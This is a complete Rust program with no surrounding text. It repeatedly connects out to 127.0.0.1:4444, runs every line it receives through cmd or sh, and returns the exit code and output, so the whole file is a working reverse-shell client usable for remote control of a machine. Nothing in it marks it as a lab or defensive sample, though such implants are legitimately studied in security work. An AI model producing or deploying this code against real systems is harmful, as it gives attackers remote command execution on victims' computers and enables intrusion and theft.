    use std::io::{self, BufRead, BufReader, Write};
    use std::net::TcpStream;
    use std::process::Command;
    use std::thread;
    use std::time::Duration;
    
    fn main() -> io::Result<()> {
        let addr = "127.0.0.1:4444";
        loop {
            match TcpStream::connect(addr) {
                Ok(mut stream) => {
                    eprintln!("Connected to {}", addr);
                    if let Err(e) = handle_connection(&mut stream) {
                        eprintln!("Connection error: {}", e);
                    }
                }
                Err(e) => {
                    eprintln!("Failed to connect to {}: {}. Retrying...", addr, e);
                }
            }
            thread::sleep(Duration::from_secs(5));
        }
    }
    
    fn handle_connection(stream: &mut TcpStream) -> io::Result<()> {
        stream.set_nodelay(true)?;
        let peer = stream.peer_addr().ok();
        let mut reader = BufReader::new(stream.try_clone()?);
        let mut line = String::new();
    
        loop {
            line.clear();
            let n = reader.read_line(&mut line)?;
            if n == 0 {
                eprintln!("Server closed connection: {:?}", peer);
                return Ok(());
            }
    
            let cmd = line.trim_end_matches(&['\n', '\r'][..]);
            if cmd.is_empty() {
                continue;
            }
    
            eprintln!("Executing command: {}", cmd);
    
            let output = if cfg!(target_os = "windows") {
                Command::new("cmd").args(&["/C", cmd]).output()
            } else {
                Command::new("sh").arg("-c").arg(cmd).output()
            };
    
            match output {
                Ok(out) => {
                    let code = out.status.code().map(|c| c.to_string()).unwrap_or_else(|| 
"<signal>".to_string());
                    let stdout = String::from_utf8_lossy(&out.stdout);
                    let stderr = String::from_utf8_lossy(&out.stderr);
    
                    let response = format!(
                        "EXIT_CODE: {}\nSTDOUT:\n{}\nSTDERR:\n{}\nEND_OF_RESULT\n",
                        code, stdout, stderr
                    );
    
                    stream.write_all(response.as_bytes())?;
                    stream.flush()?;
                }
                Err(e) => {
                    let response = format!("ERROR: failed to execute command: {}\nEND_OF_RESULT\n", e);
                    stream.write_all(response.as_bytes())?;
                    stream.flush()?;
                }
            }
        }
    }
    

